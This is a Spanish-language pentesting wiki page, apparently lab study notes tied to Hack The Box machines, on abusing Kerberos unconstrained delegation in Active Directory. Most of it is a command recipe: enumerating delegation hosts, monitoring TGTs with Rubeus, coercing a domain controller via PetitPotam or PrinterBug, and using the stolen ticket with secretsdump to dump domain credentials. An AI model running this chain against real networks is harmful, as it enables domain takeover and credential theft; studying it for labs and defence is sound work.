# Técnica: delegacion sin restriccion

[[00-inicio|Inicio]] · [[Entorno|Entorno]] · [[Puertos|Puertos]] · [[Servicios|Servicios]] · [[Tecnicas|Tecnicas]] · [[Maquinas|Maquinas]] · [[Referencias|Referencias]]

**5 máquina(s)** mencionan esta técnica.

Alias buscados: `unconstrained delegation`

> Esta técnica tiene **recetario de comandos**. Está más abajo, después de la lista de máquinas.

## Comandos

> **Placeholders**: `<DC_IP>` · `<DOMINIO>` · `<USER>`/`<PASS>` · `<PIVOTE>` (host con delegación)

### Cómo funciona

Un equipo o servicio con `TRUSTED_FOR_DELEGATION` **acumula en memoria los TGT
de cualquiera que se autentique contra él**, sin restricción.

La jugada: forzar a un DC (o a una cuenta privilegiada) a autenticarse contra
ese host, y después robarle el TGT. Con el TGT del DC → DCSync.

### Paso 1 — Encontrar hosts con delegación sin restricción

```bash
/usr/bin/nxc ldap <DC_IP> -u '<USER>' -p '<PASS>' -d <DOMINIO> --find-delegation
findDelegation.py '<DOMINIO>/<USER>':'<PASS>' -dc-ip <DC_IP>

# BloodHound marca la arista: "Unconstrained Delegation"
```

### Paso 2 — Ser admin local en ese host

Necesitás ejecución como Administrador/SYSTEM ahí, porque vas a leer TGTs de
memoria.

```bash
/usr/bin/nxc smb <PIVOTE> -u '<USER>' -p '<PASS>' -d <DOMINIO> -x 'whoami'
evil-winrm -i <PIVOTE> -u '<USER>' -p '<PASS>'
```

### Paso 3 — Monitorizar TGTs en memoria

```powershell
# Rubeus, desde el host comprometido
.\Rubeus.exe monitor /interval:5 /nowrap
```

### Paso 4 — Forzar la autenticación del DC hacia el pivote

**Esto es coerción.** Necesitás que el DC se conecte hacia vos.

```bash
# PetitPotam (vía EFSRPC)
PetitPotam.py -u '<USER>' -p '<PASS>' -d <dominio.local> <PIVOTE> <DC_IP>
# O desde NetExec
/usr/bin/nxc smb <DC_IP> -u '<USER>' -p '<PASS>' -M petitpotam

# PrinterBug (vía spooler)
printerbug.py '<DOMINIO>/<USER>':'<PASS>'@<DC_IP> <PIVOTE>
```

> **Limitación de red**: la coerción necesita que la víctima se conecte **de
> vuelta a vos**. A través de un SOCKS proxy **no funciona**. Necesitás
> ligolo-ng o un redireccionador en el pivote. Ver [[07-pivoting]].

### Paso 5 — Usar el TGT del DC

Rubeus te da un base64. Convertilo y usalo:

```bash
echo '<BASE64>' | base64 -d > dc.kirbi
ticketConverter.py dc.kirbi dc.ccache
export KRB5CCNAME=dc.ccache
secretsdump.py -k -no-pass <DC>.<dominio> -just-dc
```

### Si no podés coercionar

Probá otro camino. La coerción es frágil: depende del spooler, de 445/135
alcanzables, de que no haya parches. Si no sale rápido, **cambiá de vector** —
RBCD o ADCS suelen ser más directos.


---

## Máquinas

- [[htb-delegate\|Delegate]] — 8 mención(es) · Windows · Medium
- [[htb-university\|University]] — 4 mención(es) · Windows · Insane
- [[htb-redelegate\|Redelegate]] — 3 mención(es) · Windows · Hard
- [[htb-pirate\|Pirate]] — 1 mención(es) · Windows · Hard
- [[htb-rebound\|Rebound]] — 1 mención(es) · Windows · Insane

## Cómo ver el contexto

```bash
python3 _sistema/herramientas/buscar.py 'delegacion sin restriccion' -v
python3 _sistema/herramientas/buscar.py 'delegacion sin restriccion' -v --oscp
```
